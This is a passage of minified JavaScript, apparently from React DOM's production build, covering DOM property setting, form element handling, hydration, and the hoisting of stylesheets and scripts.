S=l,U=S.alternate,J=S.stateNode;if(S=S.tag,U!==null&&U===u)break;S!==5&&S!==26&&S!==27||J===null||(U=J,m?(J=ao(l,y),J!=null&&A.unshift(Du(l,J,U))):m||(J=ao(l,y),J!=null&&A.push(Du(l,J,U)))),l=l.return}A.length!==0&&r.push({event:a,listeners:A})}var d3=/\r\n?/g,h3=/\u0000|\uFFFD/g;function f1(r){return(typeof r=="string"?r:""+r).replace(d3,`
`).replace(h3,"")}function m1(r,a){return a=f1(a),f1(r)===a}function of(){}function Dt(r,a,l,u,m,y){switch(l){case"children":typeof u=="string"?a==="body"||a==="textarea"&&u===""||Yi(r,u):(typeof u=="number"||typeof u=="bigint")&&a!=="body"&&Yi(r,""+u);break;case"className":ni(r,"class",u);break;case"tabIndex":ni(r,"tabindex",u);break;case"dir":case"role":case"viewBox":case"width":case"height":ni(r,l,u);break;case"style":Qc(r,u,y);break;case"data":if(a!=="object"){ni(r,"data",u);break}case"src":case"href":if(u===""&&(a!=="a"||l!=="href")){r.removeAttribute(l);break}if(u==null||typeof u=="function"||typeof u=="symbol"||typeof u=="boolean"){r.removeAttribute(l);break}u=cl(""+u),r.setAttribute(l,u);break;case"action":case"formAction":if(typeof u=="function"){r.setAttribute(l,"javascript:throw new Error('A React form was unexpectedly submitted. If you called form.submit() manually, consider using form.requestSubmit() instead. If you\\'re trying to use event.stopPropagation() in a submit event handler, consider also calling event.preventDefault().')");break}else typeof y=="function"&&(l==="formAction"?(a!=="input"&&Dt(r,a,"name",m.name,m,null),Dt(r,a,"formEncType",m.formEncType,m,null),Dt(r,a,"formMethod",m.formMethod,m,null),Dt(r,a,"formTarget",m.formTarget,m,null)):(Dt(r,a,"encType",m.encType,m,null),Dt(r,a,"method",m.method,m,null),Dt(r,a,"target",m.target,m,null)));if(u==null||typeof u=="symbol"||typeof u=="boolean"){r.removeAttribute(l);break}u=cl(""+u),r.setAttribute(l,u);break;case"onClick":u!=null&&(r.onclick=of);break;case"onScroll":u!=null&&at("scroll",r);break;case"onScrollEnd":u!=null&&at("scrollend",r);break;case"dangerouslySetInnerHTML":if(u!=null){if(typeof u!="object"||!("__html"in u))throw Error(i(61));if(l=u.__html,l!=null){if(m.children!=null)throw Error(i(60));r.innerHTML=l}}break;case"multiple":r.multiple=u&&typeof u!="function"&&typeof u!="symbol";break;case"muted":r.muted=u&&typeof u!="function"&&typeof u!="symbol";break;case"suppressContentEditableWarning":case"suppressHydrationWarning":case"defaultValue":case"defaultChecked":case"innerHTML":case"ref":break;case"autoFocus":break;case"xlinkHref":if(u==null||typeof u=="function"||typeof u=="boolean"||typeof u=="symbol"){r.removeAttribute("xlink:href");break}l=cl(""+u),r.setAttributeNS("http://www.w3.org/1999/xlink","xlink:href",l);break;case"contentEditable":case"spellCheck":case"draggable":case"value":case"autoReverse":case"externalResourcesRequired":case"focusable":case"preserveAlpha":u!=null&&typeof u!="function"&&typeof u!="symbol"?r.setAttribute(l,""+u):r.removeAttribute(l);break;case"inert":case"allowFullScreen":case"async":case"autoPlay":case"controls":case"default":case"defer":case"disabled":case"disablePictureInPicture":case"disableRemotePlayback":case"formNoValidate":case"hidden":case"loop":case"noModule":case"noValidate":case"open":case"playsInline":case"readOnly":case"required":case"reversed":case"scoped":case"seamless":case"itemScope":u&&typeof u!="function"&&typeof u!="symbol"?r.setAttribute(l,""):r.removeAttribute(l);break;case"capture":case"download":u===!0?r.setAttribute(l,""):u!==!1&&u!=null&&typeof u!="function"&&typeof u!="symbol"?r.setAttribute(l,u):r.removeAttribute(l);break;case"cols":case"rows":case"size":case"span":u!=null&&typeof u!="function"&&typeof u!="symbol"&&!isNaN(u)&&1<=u?r.setAttribute(l,u):r.removeAttribute(l);break;case"rowSpan":case"start":u==null||typeof u=="function"||typeof u=="symbol"||isNaN(u)?r.removeAttribute(l):r.setAttribute(l,u);break;case"popover":at("beforetoggle",r),at("toggle",r),qn(r,"popover",u);break;case"xlinkActuate":Ge(r,"http://www.w3.org/1999/xlink","xlink:actuate",u);break;case"xlinkArcrole":Ge(r,"http://www.w3.org/1999/xlink","xlink:arcrole",u);break;case"xlinkRole":Ge(r,"http://www.w3.org/1999/xlink","xlink:role",u);break;case"xlinkShow":Ge(r,"http://www.w3.org/1999/xlink","xlink:show",u);break;case"xlinkTitle":Ge(r,"http://www.w3.org/1999/xlink","xlink:title",u);break;case"xlinkType":Ge(r,"http://www.w3.org/1999/xlink","xlink:type",u);break;case"xmlBase":Ge(r,"http://www.w3.org/XML/1998/namespace","xml:base",u);break;case"xmlLang":Ge(r,"http://www.w3.org/XML/1998/namespace","xml:lang",u);break;case"xmlSpace":Ge(r,"http://www.w3.org/XML/1998/namespace","xml:space",u);break;case"is":qn(r,"is",u);break;case"innerText":case"textContent":break;default:(!(2<l.length)||l[0]!=="o"&&l[0]!=="O"||l[1]!=="n"&&l[1]!=="N")&&(l=Yp.get(l)||l,qn(r,l,u))}}function Ay(r,a,l,u,m,y){switch(l){case"style":Qc(r,u,y);break;case"dangerouslySetInnerHTML":if(u!=null){if(typeof u!="object"||!("__html"in u))throw Error(i(61));if(l=u.__html,l!=null){if(m.children!=null)throw Error(i(60));r.innerHTML=l}}break;case"children":typeof u=="string"?Yi(r,u):(typeof u=="number"||typeof u=="bigint")&&Yi(r,""+u);break;case"onScroll":u!=null&&at("scroll",r);break;case"onScrollEnd":u!=null&&at("scrollend",r);break;case"onClick":u!=null&&(r.onclick=of);break;case"suppressContentEditableWarning":case"suppressHydrationWarning":case"innerHTML":case"ref":break;case"innerText":case"textContent":break;default:if(!qi.hasOwnProperty(l))e:{if(l[0]==="o"&&l[1]==="n"&&(m=l.endsWith("Capture"),a=l.slice(2,m?l.length-7:void 0),y=r[pe]||null,y=y!=null?y[l]:null,typeof y=="function"&&r.removeEventListener(a,y,m),typeof u=="function")){typeof y!="function"&&y!==null&&(l in r?r[l]=null:r.hasAttribute(l)&&r.removeAttribute(l)),r.addEventListener(a,u,m);break e}l in r?r[l]=u:u===!0?r.setAttribute(l,""):qn(r,l,u)}}}function jn(r,a,l){switch(a){case"div":case"span":case"svg":case"path":case"a":case"g":case"p":case"li":break;case"img":at("error",r),at("load",r);var u=!1,m=!1,y;for(y in l)if(l.hasOwnProperty(y)){var A=l[y];if(A!=null)switch(y){case"src":u=!0;break;case"srcSet":m=!0;break;case"children":case"dangerouslySetInnerHTML":throw Error(i(137,a));default:Dt(r,a,y,A,l,null)}}m&&Dt(r,a,"srcSet",l.srcSet,l,null),u&&Dt(r,a,"src",l.src,l,null);return;case"input":at("invalid",r);var S=y=A=m=null,U=null,J=null;for(u in l)if(l.hasOwnProperty(u)){var se=l[u];if(se!=null)switch(u){case"name":m=se;break;case"type":A=se;break;case"checked":U=se;break;case"defaultChecked":J=se;break;case"value":y=se;break;case"defaultValue":S=se;break;case"children":case"dangerouslySetInnerHTML":if(se!=null)throw Error(i(137,a));break;default:Dt(r,a,u,se,l,null)}}io(r,y,S,U,J,A,m,!1),ll(r);return;case"select":at("invalid",r),u=A=y=null;for(m in l)if(l.hasOwnProperty(m)&&(S=l[m],S!=null))switch(m){case"value":y=S;break;case"defaultValue":A=S;break;case"multiple":u=S;default:Dt(r,a,m,S,l,null)}a=y,l=A,r.multiple=!!u,a!=null?ls(r,!!u,a,!1):l!=null&&ls(r,!!u,l,!0);return;case"textarea":at("invalid",r),y=m=u=null;for(A in l)if(l.hasOwnProperty(A)&&(S=l[A],S!=null))switch(A){case"value":u=S;break;case"defaultValue":m=S;break;case"children":y=S;break;case"dangerouslySetInnerHTML":if(S!=null)throw Error(i(91));break;default:Dt(r,a,A,S,l,null)}ro(r,u,m,y),ll(r);return;case"option":for(U in l)if(l.hasOwnProperty(U)&&(u=l[U],u!=null))switch(U){case"selected":r.selected=u&&typeof u!="function"&&typeof u!="symbol";break;default:Dt(r,a,U,u,l,null)}return;case"dialog":at("beforetoggle",r),at("toggle",r),at("cancel",r),at("close",r);break;case"iframe":case"object":at("load",r);break;case"video":case"audio":for(u=0;u<ku.length;u++)at(ku[u],r);break;case"image":at("error",r),at("load",r);break;case"details":at("toggle",r);break;case"embed":case"source":case"link":at("error",r),at("load",r);case"area":case"base":case"br":case"col":case"hr":case"keygen":case"meta":case"param":case"track":case"wbr":case"menuitem":for(J in l)if(l.hasOwnProperty(J)&&(u=l[J],u!=null))switch(J){case"children":case"dangerouslySetInnerHTML":throw Error(i(137,a));default:Dt(r,a,J,u,l,null)}return;default:if(Kc(a)){for(se in l)l.hasOwnProperty(se)&&(u=l[se],u!==void 0&&Ay(r,a,se,u,l,void 0));return}}for(S in l)l.hasOwnProperty(S)&&(u=l[S],u!=null&&Dt(r,a,S,u,l,null))}function f3(r,a,l,u){switch(a){case"div":case"span":case"svg":case"path":case"a":case"g":case"p":case"li":break;case"input":var m=null,y=null,A=null,S=null,U=null,J=null,se=null;for(ne in l){var ce=l[ne];if(l.hasOwnProperty(ne)&&ce!=null)switch(ne){case"checked":break;case"value":break;case"defaultValue":U=ce;default:u.hasOwnProperty(ne)||Dt(r,a,ne,null,u,ce)}}for(var te in u){var ne=u[te];if(ce=l[te],u.hasOwnProperty(te)&&(ne!=null||ce!=null))switch(te){case"type":y=ne;break;case"name":m=ne;break;case"checked":J=ne;break;case"defaultChecked":se=ne;break;case"value":A=ne;break;case"defaultValue":S=ne;break;case"children":case"dangerouslySetInnerHTML":if(ne!=null)throw Error(i(137,a));break;default:ne!==ce&&Dt(r,a,te,ne,u,ce)}}Ci(r,A,S,U,J,se,y,m);return;case"select":ne=A=S=te=null;for(y in l)if(U=l[y],l.hasOwnProperty(y)&&U!=null)switch(y){case"value":break;case"multiple":ne=U;default:u.hasOwnProperty(y)||Dt(r,a,y,null,u,U)}for(m in u)if(y=u[m],U=l[m],u.hasOwnProperty(m)&&(y!=null||U!=null))switch(m){case"value":te=y;break;case"defaultValue":S=y;break;case"multiple":A=y;default:y!==U&&Dt(r,a,m,y,u,U)}a=S,l=A,u=ne,te!=null?ls(r,!!l,te,!1):!!u!=!!l&&(a!=null?ls(r,!!l,a,!0):ls(r,!!l,l?[]:"",!1));return;case"textarea":ne=te=null;for(S in l)if(m=l[S],l.hasOwnProperty(S)&&m!=null&&!u.hasOwnProperty(S))switch(S){case"value":break;case"children":break;default:Dt(r,a,S,null,u,m)}for(A in u)if(m=u[A],y=l[A],u.hasOwnProperty(A)&&(m!=null||y!=null))switch(A){case"value":te=m;break;case"defaultValue":ne=m;break;case"children":break;case"dangerouslySetInnerHTML":if(m!=null)throw Error(i(91));break;default:m!==y&&Dt(r,a,A,m,u,y)}It(r,te,ne);return;case"option":for(var Fe in l)if(te=l[Fe],l.hasOwnProperty(Fe)&&te!=null&&!u.hasOwnProperty(Fe))switch(Fe){case"selected":r.selected=!1;break;default:Dt(r,a,Fe,null,u,te)}for(U in u)if(te=u[U],ne=l[U],u.hasOwnProperty(U)&&te!==ne&&(te!=null||ne!=null))switch(U){case"selected":r.selected=te&&typeof te!="function"&&typeof te!="symbol";break;default:Dt(r,a,U,te,u,ne)}return;case"img":case"link":case"area":case"base":case"br":case"col":case"embed":case"hr":case"keygen":case"meta":case"param":case"source":case"track":case"wbr":case"menuitem":for(var Le in l)te=l[Le],l.hasOwnProperty(Le)&&te!=null&&!u.hasOwnProperty(Le)&&Dt(r,a,Le,null,u,te);for(J in u)if(te=u[J],ne=l[J],u.hasOwnProperty(J)&&te!==ne&&(te!=null||ne!=null))switch(J){case"children":case"dangerouslySetInnerHTML":if(te!=null)throw Error(i(137,a));break;default:Dt(r,a,J,te,u,ne)}return;default:if(Kc(a)){for(var Mt in l)te=l[Mt],l.hasOwnProperty(Mt)&&te!==void 0&&!u.hasOwnProperty(Mt)&&Ay(r,a,Mt,void 0,u,te);for(se in u)te=u[se],ne=l[se],!u.hasOwnProperty(se)||te===ne||te===void 0&&ne===void 0||Ay(r,a,se,te,u,ne);return}}for(var K in l)te=l[K],l.hasOwnProperty(K)&&te!=null&&!u.hasOwnProperty(K)&&Dt(r,a,K,null,u,te);for(ce in u)te=u[ce],ne=l[ce],!u.hasOwnProperty(ce)||te===ne||te==null&&ne==null||Dt(r,a,ce,te,u,ne)}var Ey=null,Ty=null;function lf(r){return r.nodeType===9?r:r.ownerDocument}function p1(r){switch(r){case"http://www.w3.org/2000/svg":return 1;case"http://www.w3.org/1998/Math/MathML":return 2;default:return 0}}function g1(r,a){if(r===0)switch(a){case"svg":return 1;case"math":return 2;default:return 0}return r===1&&a==="foreignObject"?0:r}function Cy(r,a){return r==="textarea"||r==="noscript"||typeof a.children=="string"||typeof a.children=="number"||typeof a.children=="bigint"||typeof a.dangerouslySetInnerHTML=="object"&&a.dangerouslySetInnerHTML!==null&&a.dangerouslySetInnerHTML.__html!=null}var Sy=null;function m3(){var r=window.event;return r&&r.type==="popstate"?r===Sy?!1:(Sy=r,!0):(Sy=null,!1)}var y1=typeof setTimeout=="function"?setTimeout:void 0,p3=typeof clearTimeout=="function"?clearTimeout:void 0,v1=typeof Promise=="function"?Promise:void 0,g3=typeof queueMicrotask=="function"?queueMicrotask:typeof v1<"u"?function(r){return v1.resolve(null).then(r).catch(y3)}:y1;function y3(r){setTimeout(function(){throw r})}function ya(r){return r==="head"}function _1(r,a){var l=a,u=0,m=0;do{var y=l.nextSibling;if(r.removeChild(l),y&&y.nodeType===8)if(l=y.data,l==="/$"){if(0<u&&8>u){l=u;var A=r.ownerDocument;if(l&1&&Mu(A.documentElement),l&2&&Mu(A.body),l&4)for(l=A.head,Mu(l),A=l.firstChild;A;){var S=A.nextSibling,U=A.nodeName;A[je]||U==="SCRIPT"||U==="STYLE"||U==="LINK"&&A.rel.toLowerCase()==="stylesheet"||l.removeChild(A),A=S}}if(m===0){r.removeChild(y),zu(a);return}m--}else l==="$"||l==="$?"||l==="$!"?m++:u=l.charCodeAt(0)-48;else u=0;l=y}while(l);zu(a)}function Ny(r){var a=r.firstChild;for(a&&a.nodeType===10&&(a=a.nextSibling);a;){var l=a;switch(a=a.nextSibling,l.nodeName){case"HTML":case"HEAD":case"BODY":Ny(l),Se(l);continue;case"SCRIPT":case"STYLE":continue;case"LINK":if(l.rel.toLowerCase()==="stylesheet")continue}r.removeChild(l)}}function v3(r,a,l,u){for(;r.nodeType===1;){var m=l;if(r.nodeName.toLowerCase()!==a.toLowerCase()){if(!u&&(r.nodeName!=="INPUT"||r.type!=="hidden"))break}else if(u){if(!r[je])switch(a){case"meta":if(!r.hasAttribute("itemprop"))break;return r;case"link":if(y=r.getAttribute("rel"),y==="stylesheet"&&r.hasAttribute("data-precedence"))break;if(y!==m.rel||r.getAttribute("href")!==(m.href==null||m.href===""?null:m.href)||r.getAttribute("crossorigin")!==(m.crossOrigin==null?null:m.crossOrigin)||r.getAttribute("title")!==(m.title==null?null:m.title))break;return r;case"style":if(r.hasAttribute("data-precedence"))break;return r;case"script":if(y=r.getAttribute("src"),(y!==(m.src==null?null:m.src)||r.getAttribute("type")!==(m.type==null?null:m.type)||r.getAttribute("crossorigin")!==(m.crossOrigin==null?null:m.crossOrigin))&&y&&r.hasAttribute("async")&&!r.hasAttribute("itemprop"))break;return r;default:return r}}else if(a==="input"&&r.type==="hidden"){var y=m.name==null?null:""+m.name;if(m.type==="hidden"&&r.getAttribute("name")===y)return r}else return r;if(r=pr(r.nextSibling),r===null)break}return null}function _3(r,a,l){if(a==="")return null;for(;r.nodeType!==3;)if((r.nodeType!==1||r.nodeName!=="INPUT"||r.type!=="hidden")&&!l||(r=pr(r.nextSibling),r===null))return null;return r}function Ry(r){return r.data==="$!"||r.data==="$?"&&r.ownerDocument.readyState==="complete"}function w3(r,a){var l=r.ownerDocument;if(r.data!=="$?"||l.readyState==="complete")a();else{var u=function(){a(),l.removeEventListener("DOMContentLoaded",u)};l.addEventListener("DOMContentLoaded",u),r._reactRetry=u}}function pr(r){for(;r!=null;r=r.nextSibling){var a=r.nodeType;if(a===1||a===3)break;if(a===8){if(a=r.data,a==="$"||a==="$!"||a==="$?"||a==="F!"||a==="F")break;if(a==="/$")return null}}return r}var Iy=null;function w1(r){r=r.previousSibling;for(var a=0;r;){if(r.nodeType===8){var l=r.data;if(l==="$"||l==="$!"||l==="$?"){if(a===0)return r;a--}else l==="/$"&&a++}r=r.previousSibling}return null}function b1(r,a,l){switch(a=lf(l),r){case"html":if(r=a.documentElement,!r)throw Error(i(452));return r;case"head":if(r=a.head,!r)throw Error(i(453));return r;case"body":if(r=a.body,!r)throw Error(i(454));return r;default:throw Error(i(451))}}function Mu(r){for(var a=r.attributes;a.length;)r.removeAttributeNode(a[0]);Se(r)}var nr=new Map,x1=new Set;function cf(r){return typeof r.getRootNode=="function"?r.getRootNode():r.nodeType===9?r:r.ownerDocument}var Ss=me.d;me.d={f:b3,r:x3,D:A3,C:E3,L:T3,m:C3,X:N3,S:S3,M:R3};function b3(){var r=Ss.f(),a=Jh();return r||a}function x3(r){var a=rt(r);a!==null&&a.tag===5&&a.type==="form"?F2(a):Ss.r(r)}var Hl=typeof document>"u"?null:document;function A1(r,a,l){var u=Hl;if(u&&typeof a=="string"&&a){var m=an(a);m='link[rel="'+r+'"][href="'+m+'"]',typeof l=="string"&&(m+='[crossorigin="'+l+'"]'),x1.has(m)||(x1.add(m),r={rel:r,crossOrigin:l,href:a},u.querySelector(m)===null&&(a=u.createElement("link"),jn(a,"link",r),ut(a),u.head.appendChild(a)))}}function A3(r){Ss.D(r),A1("dns-prefetch",r,null)}function E3(r,a){Ss.C(r,a),A1("preconnect",r,a)}function T3(r,a,l){Ss.L(r,a,l);var u=Hl;if(u&&r&&a){var m='link[rel="preload"][as="'+an(a)+'"]';a==="image"&&l&&l.imageSrcSet?(m+='[imagesrcset="'+an(l.imageSrcSet)+'"]',typeof l.imageSizes=="string"&&(m+='[imagesizes="'+an(l.imageSizes)+'"]')):m+='[href="'+an(r)+'"]';var y=m;switch(a){case"style":y=ql(r);break;case"script":y=Gl(r)}nr.has(y)||(r=v({rel:"preload",href:a==="image"&&l&&l.imageSrcSet?void 0:r,as:a},l),nr.set(y,r),u.querySelector(m)!==null||a==="style"&&u.querySelector(Ou(y))||a==="script"&&u.querySelector(Pu(y))||(a=u.createElement("link"),jn(a,"link",r),ut(a),u.head.appendChild(a)))}}function C3(r,a){Ss.m(r,a);var l=Hl;if(l&&r){var u=a&&typeof a.as=="string"?a.as:"script",m='link[rel="modulepreload"][as="'+an(u)+'"][href="'+an(r)+'"]',y=m;switch(u){case"audioworklet":case"paintworklet":case"serviceworker":case"sharedworker":case"worker":case"script":y=Gl(r)}if(!nr.has(y)&&(r=v({rel:"modulepreload",href:r},a),nr.set(y,r),l.querySelector(m)===null)){switch(u){case"audioworklet":case"paintworklet":case"serviceworker":case"sharedworker":case"worker":case"script":if(l.querySelector(Pu(y)))return}u=l.createElement("link"),jn(u,"link",r),ut(u),l.head.appendChild(u)}}}function S3(r,a,l){Ss.S(r,a,l);var u=Hl;if(u&&r){var m=yt(u).hoistableStyles,y=ql(r);a=a||"default";var A=m.get(y);if(!A){var S={loading:0,preload:null};if(A=u.querySelector(Ou(y)))S.loading=5;else{r=v({rel:"stylesheet",href:r,"data-precedence":a},l),(l=nr.get(y))&&ky(r,l);var U=A=u.createElement("link");ut(U),jn(U,"link",r),U._p=new Promise(function(J,se){U.onload=J,U.onerror=se}),U.addEventListener("load",function(){S.loading|=1}),U.addEventListener("error",function(){S.loading|=2}),S.loading|=4,uf(A,a,u)}A={type:"stylesheet",instance:A,count:1,state:S},m.set(y,A)}}}function N3(r,a){Ss.X(r,a);var l=Hl;if(l&&r){var u=yt(l).hoistableScripts,m=Gl(r),y=u.get(m);y||(y=l.querySelector(Pu(m)),y||(r=v({src:r,async:!0},a),(a=nr.get(m))&&Dy(r,a),y=l.createElement("script"),ut(y),jn(y,"link",r),l.head.appendChild(y)),y={type:"script",instance:y,count:1,state:null},u.set(m,y))}}function R3(r,a){Ss.M(r,a);var l=Hl;if(l&&r){var u=yt(l).hoistableScripts,m=Gl(r),y=u.get(m);y||(y=l.querySelector(Pu(m)),y||(r=v({src:r,async:!0,type:"module"},a),(a=nr.get(m))&&Dy(r,a),y=l.createElement("script"),ut(y),jn(y,"link",r),l.head.appendChild(y)),y={type:"script",instance:y,count:1,state:null},u.set(m,y))}}function E1(r,a,l,u){var m=(m=he.current)?cf(m):null;if(!m)throw Error(i(446));switch(r){case"meta":case"title":return null;case"style":return typeof l.precedence=="string"&&typeof l.href=="string"?(a=ql(l.href),l=yt(m).hoistableStyles,u=l.get(a),u||(u={type:"style",instance:null,count:0,state:null},l.set(a,u)),u):{type:"void",instance:null,count:0,state:null};case"link":if(l.rel==="stylesheet"&&typeof l.href=="string"&&typeof l.precedence=="string"){r=ql(l.href);var y=yt(m).hoistableStyles,A=y.get(r);if(A||(m=m.ownerDocument||m,A={type:"stylesheet",instance:null,count:0,state:{loading:0,preload:null}},y.set(r,A),(y=m.querySelector(Ou(r)))&&!y._p&&(A.instance=y,A.state.loading=5),nr.has(r)||(l={rel:"preload",as:"style",href:l.href,crossOrigin:l.crossOrigin,integrity:l.integrity,media:l.media,hrefLang:l.hrefLang,referrerPolicy:l.referrerPolicy},nr.set(r,l),y||I3(m,r,l,A.state))),a&&u===null)throw Error(i(528,""));return A}if(a&&u!==null)throw Error(i(529,""));return null;case"script":return a=l.async,l=l.src,typeof l=="string"&&a&&typeof a!="function"&&typeof a!="symbol"?(a=Gl(l),l=yt(m).hoistableScripts,u=l.get(a),u||(u={type:"script",instance:null,count:0,state:null},l.set(a,u)),u):{type:"void",instance:null,count:0,state:null};default:throw Error(i(444,r))}}function ql(r){return'href="'+an(r)+'"'}function Ou(r){return'link[rel="stylesheet"]['+r+"]"}function T1(r){return v({},r,{"data-precedence":r.precedence,precedence:null})}function I3(r,a,l,u){r.querySelector('link[rel="preload"][as="style"]['+a+"]")?u.loading=1:(a=r.createElement("link"),u.preload=a,a.addEventListener("load",function(){return u.loading|=1}),a.addEventListener("error",function(){return u.loading|=2}),jn(a,"link",l),ut(a),r.head.appendChild(a))}function Gl(r){return'[src="'+an(r)+'"]'}function Pu(r){return"script[async]"+r}function C1(r,a,l){if(a.count++,a.instance===null)switch(a.type){case"style":var u=r.querySelector('style[data-href~="'+an(l.href)+'"]');if(u)return a.instance=u,ut(u),u;var m=v({},l,{"data-href":l.href,"data-precedence":l.precedence,href:null,precedence:null});return u=(r.ownerDocument||r).createElement("style"),ut(u),jn(u,"style",m),uf(u,l.precedence,r),a.instance=u;case"stylesheet":m=ql(l.href);var y=r.querySelector(Ou(m));if(y)return a.state.loading|=4,a.instance=y,ut(y),y;u=T1(l),(m=nr.get(m))&&ky(u,m),y=(r.ownerDocument||r).createElement("link"),ut(y);var A=y;return A._p=new Promise(function(S,U){A.onload=S,A.onerror=U}),jn(y,"link",u),a.state.loading|=4,uf(y,l.precedence,r),a.instance=y;case"script":return y=Gl(l.src),(m=r.querySelector(Pu(y)))?(a.instance=m,ut(m),m):(u=l,(m=nr.get(y))&&(u=v({},l),Dy(u,m)),r=r.ownerDocument||r,m=r.createElement("script"),ut(m),jn(m,"link",u),r.head.appendChild(m),a.instance=m);case"void":return null;default:throw Error(i(443,a.type))}else a.type==="stylesheet"&&(a.state.loading&4)===0&&(u=a.instance,a.state.loading|=4,uf(u,l.precedence,r));return a.instance}function uf(r,a,l){for(var u=l.querySelectorAll('link[rel="stylesheet"][data-precedence],style[data-precedence]'),m=u.length?u[u.length-1]:null,y=m,A=0;A<u.length;A++){var S=u[A];if(S.dataset.precedence===a)y=S;else if(y!==m)break}y?y.parentNode.insertBefore(r,y.nextSibling):(a=l.nodeType===9?l.head:l,a.insertBefore(r,a.firstChild))}function ky(r,a){r.crossOrigin==null&&(r.crossOrigin=a.crossOrigin),r.referrerPolicy==null&&(r.referrerPolicy=a.referrerPolicy),r.title==null&&(r.title=a.title)}function Dy(r,a){r.crossOrigin==null&&(r.crossOrigin=a.crossOrigin),r.referrerPolicy==null&&(r.referrerPolicy=a.referrerPolicy),r.integrity==null&&(r.integrity=a.integrity)}var df=null;function S1(r,a,l){if(df===null){var u=new Map,m=df=new Map;m.set(l,u)}else m=df,u=m.get(l),u||(u=new Map,m.set(l,u));if(u.has(r))return u;for(u.set(r,null),l=l.getElementsByTagName(r),m=0;m<l.length;m++){var y=l[m];if(!(y[je]||y[le]||r==="link"&&y.getAttribute("rel")==="stylesheet")&&y.namespaceURI!=="http://www.w3.org/2000/svg"){var A=y.getAttribute(a)||"";A=r+A;var S=u.get(A);S?S.push(y):u.set(A,[y])}}return u}function N1(r,a,l){r=r.ownerDocument||r,r.head.insertBefore(l,a==="title"?r.querySelector("head > title"):null)}function k3(r,a,l){if(l===1||a.itemProp!=null)return!1;switch(r){case"meta":case"title":return!0;case"style":if(typeof a.precedence!="string"||typeof a.href!="string"||a.href==="")break;return!0;case"link":if(typeof a.rel!="string"||typeof a.href!="string"||a.href===""||a.onLoad||a.onError)break;switch(a.rel){case"stylesheet":return r=a.disabled,typeof a.precedence=="string"&&r==null;default:return!0}case"script":if(a.async&&typeof a.async!="function"&&typeof a.async!="symbol"&&!a.onLoad&&!a.onError&&a.src&&typeof a.src=="string")return!0}return!1}function R1(r){return!(r.type==="stylesheet"&&(r.state.loading&3)===0)}var ju=null;function D3(){}function M3(r,a,l){if(ju===null)throw Error(i(475));var u=ju;if(a.type==="stylesheet"&&(typeof l.media!="string"||matchMedia(l.media).matches!==!1)&&(a.state.loading&4)===0){if(a.instance===null){var m=ql(l.href),y=r.querySelector(Ou(m));if(y){r=y._p,r!==null&&typeof r=="object"&&typeof r.then=="function"&&(u.count++,u=hf.bind(u),r.then(u,u)),a.state.loading|=4,a.instance=y,ut(y);return}y=r.ownerDocument||r,l=T1(l),(m=nr.get(m))&&ky(l,m),y=y.createElement("link"),ut(y);var A=y;A._p=new Promise(function(S,U){A.onload=S,A.onerror=U}),jn(y,"link",l),a.instance=y}u.stylesheets===null&&(u.stylesheets=new Map),u.stylesheets.set(a,r),(r=a.state.preload)&&(a.state.loading&3)===0&&(u.count++,a=hf.bind(u),r.addEventListener("load",a),r.addEventListener("error",a))}}function O3(){if(ju===null)throw Error(i(475));var r=ju;return r.stylesheets&&r.count===0&&My(r,r.stylesheets),0<r.count?function(a){var l=setTimeout(function(){if(r.stylesheets&&My(r,r.stylesheets),r.unsuspend){var u=r.unsuspend;r.unsuspend=null,u()}},6e4);return r.unsuspend=a,function(){r.unsuspend=null,clearTimeout(l)}}:null}function hf(){if(this.count--,this.count===0){if(this.stylesheets)My(this,this.stylesheets);else if(this.unsuspend){var r=this.unsuspend;this.unsuspend=null,r()}}}var ff=null;function My(r,a){r.stylesheets=null,r.unsuspend!==null&&(r.count++,ff=new Map,a.forEach(P3,r),ff=null,hf.call(r))}function P3(r,a){if(!(a.state.loading&4)){var l=ff.get(r);if(l)var u=l.get(null);else{l=new Map,ff.set(r,l);for(var m=r.querySelectorAll("link[data-precedence],style[data-precedence]"),y=0;y<m.length;y++){var A=m[y];(A.nodeName==="LINK"||A.getAttribute("media")!=="not all")&&(l.set(A.dataset.precedence,A),u=A)}u&&l.set(null,u)}m=a.instance,A=m.getAttribute("data-precedence"),y=l.get(A)||u,y===u&&l.set(null,m),l.set(A,m),this.count++,u=hf.bind(this),m.addEventListener("load",u),m.addEventListener("error",u),y?y.parentNode.insertBefore(m,y.nextSibling):(r=r.nodeType===9?r.head:r,r.insertBefore(m,r.firstChild)),a.state.loading|=4}}var Lu={$$typeof:D,Provider:null,Consumer:null,_currentValue:we,_currentValue2:we,_threadCount:0};function j3(r,a,l,u,m,y,A,S){this.tag=1,this.containerInfo=r,this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.next=this.pendingContext=this.context=this.cancelPendingCommit=null,this.callbackPriority=0,this.expirationTimes=Hi(-1),this.entangledLanes=this.shellSuspendCounter=this.errorRecoveryDisabledLanes=this.expiredLanes=this.warmLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Hi(0),this.hiddenUpdates=Hi(null),this.identifierPrefix=u,this.onUncaughtError=m,this.onCaughtError=y,this.onRecoverableError=A,this.pooledCache=null,this.pooledCacheLanes=0,this.formState=S,this.incompleteTransitions=new Map}function I1(r,a,l,u,m,y,A,S,U,J,se,ce){return r=new j3(r,a,l,A,S,U,J,ce),a=1,y===!0&&(a|=24),y=Ni(3,null,null,a),r.current=y,y.stateNode=r,a=mg(),a.refCount++,r.pooledCache=a,a.refCount++,y.memoizedState={element:u,isDehydrated:l,cache:a},vg(y),r}function k1(r){return r?(r=xl,r):xl}function D1(r,a,l,u,m,y){m=k1(m),u.context===null?u.context=m:u.pendingContext=m,u=ra(a),u.payload={element:l},y=y===void 0?null:y,y!==null&&(u.callback=y),l=sa(r,u,a),l!==null&&(Mi(l,r,a),fu(l,r,a))}function M1(r,a){if(r=r.memoizedState,r!==null&&r.dehydrated!==null){var l=r.retryLane;r.retryLane=l!==0&&l<a?l:a}}function Oy(r,a){M1(r,a),(r=r.alternate)&&M1(r,a)}function O1(r){if(r.tag===13){var a=bl(r,67108864);a!==null&&Mi(a,r,67108864),Oy(r,67108864)}}var mf=!0;function L3(r,a,l,u){var m=ee.T;ee.T=null;var y=me.p;try{me.p=2,Py(r,a,l,u)}finally{me.p=y,ee.T=m}}function V3(r,a,l,u){var m=ee.T;ee.T=null;var y=me.p;try{me.p=8,Py(r,a,l,u)}finally{me.p=y,ee.T=m}}function Py(r,a,l,u){if(mf){var m=jy(u);if(m===null)xy(r,a,u,pf,l),j1(r,u);else if(B3(m,r,a,l,u))u.stopPropagation();else if(j1(r,u),a&4&&-1<U3.indexOf(r)){for(;m!==null;){var 